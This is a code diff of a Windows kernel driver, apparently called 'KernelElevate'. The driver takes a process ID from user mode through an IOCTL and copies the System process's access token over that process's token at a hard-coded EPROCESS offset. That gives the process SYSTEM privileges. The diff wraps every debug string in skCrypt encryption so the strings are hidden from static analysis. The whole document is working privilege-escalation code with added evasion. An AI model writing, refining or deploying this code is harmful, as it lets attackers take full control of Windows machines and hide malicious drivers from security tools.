@@ -11,7 +11,7 @@ void Log(const char* text, ...) {
     va_start(args, text);
 
     #if defined(dbgmode)
-        vDbgPrintExWithPrefix("[KernelElevate] ", 0, 0, text, args);
+        vDbgPrintExWithPrefix(skCrypt("[KernelElevate] "), 0, 0, text, args);
     #endif
 
     va_end(args);
@@ -28,8 +28,8 @@ bool elevateRights(int PID) {
     __try {
         NTSTATUS ret = PsLookupProcessByProcessId((HANDLE)PID, (PEPROCESS*)&proc);
         if (ret != STATUS_SUCCESS) {
-            if (ret == STATUS_INVALID_PARAMETER) Log("the PID is invalid.\n");
-            if (ret == STATUS_INVALID_CID) Log("the CID is invalid.\n");
+            if (ret == STATUS_INVALID_PARAMETER) Log(skCrypt("the PID is invalid.\n"));
+            if (ret == STATUS_INVALID_CID) Log(skCrypt("the CID is invalid.\n"));
 
             return FALSE;
         }
@@ -37,15 +37,15 @@ bool elevateRights(int PID) {
         PsLookupProcessByProcessId((HANDLE)0x4, (PEPROCESS*)&ntoskrnl);
 
         if (ret != STATUS_SUCCESS) {
-            if (ret == STATUS_INVALID_PARAMETER) Log("ntoskrnl PID was not found.\n");
-            if (ret == STATUS_INVALID_CID) Log("ntoskrnl PID is not valid.\n");
+            if (ret == STATUS_INVALID_PARAMETER) Log(skCrypt("ntoskrnl PID was not found.\n"));
+            if (ret == STATUS_INVALID_CID) Log(skCrypt("ntoskrnl PID is not valid.\n"));
 
             ObDereferenceObject(proc);
             return FALSE;
         }
         
         char* peName;
-        Log("pe name: %s\n", peName = PsGetProcessImageFileName((PEPROCESS)proc));
+        Log(skCrypt("pe name: %s\n"), peName = PsGetProcessImageFileName((PEPROCESS)proc));
 
         targetToken = PsReferencePrimaryToken((PEPROCESS)proc);
         if (!targetToken) {
@@ -54,7 +54,7 @@ bool elevateRights(int PID) {
             return FALSE;
         }
 
-        Log("%s token: %x\n", peName, targetToken);
+        Log(skCrypt("%s token: %x\n"), peName, targetToken);
 
         ntoskrnlToken = PsReferencePrimaryToken((PEPROCESS)ntoskrnl);
         if (!ntoskrnlToken) {
@@ -64,16 +64,16 @@ bool elevateRights(int PID) {
             return FALSE;
         }
 
-        Log("ntoskrnl token: %x\n", ntoskrnlToken);
+        Log(skCrypt("ntoskrnl token: %x\n"), ntoskrnlToken);
         ULONG_PTR UProcIdAddr = (ULONG_PTR)proc + 0x4b8;
 
-        Log("%s token addr: %x\n", peName, UProcIdAddr);
+        Log(skCrypt("%s token addr: %x\n"), peName, UProcIdAddr);
         ULONG_PTR ntoskrnladdr = (ULONG_PTR)ntoskrnl + 0x4b8;
 
-        Log("ntoskrnl token addr: %x\n", ntoskrnladdr);
+        Log(skCrypt("ntoskrnl token addr: %x\n"), ntoskrnladdr);
         *(PHANDLE)UProcIdAddr = *(PHANDLE)ntoskrnladdr;
 
-        Log("%s token upgraded to: %x ", peName, *(PHANDLE)(UProcIdAddr));
+        Log(skCrypt("%s token upgraded to: %x "), peName, *(PHANDLE)(UProcIdAddr));
     }
     __except (EXCEPTION_EXECUTE_HANDLER) {
         return FALSE;
@@ -99,7 +99,7 @@ NTSTATUS IoControl(PDEVICE_OBJECT devObj, PIRP irp) {
 
             RtlCopyMemory(&recvPID, irp->AssociatedIrp.SystemBuffer, sizeof(recvPID));
             status = elevateRights(recvPID);
-            Log("received PID: %d\n", recvPID);
+            Log(skCrypt("received PID: %d\n"), recvPID);
         }
     }
     IoCompleteRequest(irp, IO_NO_INCREMENT);
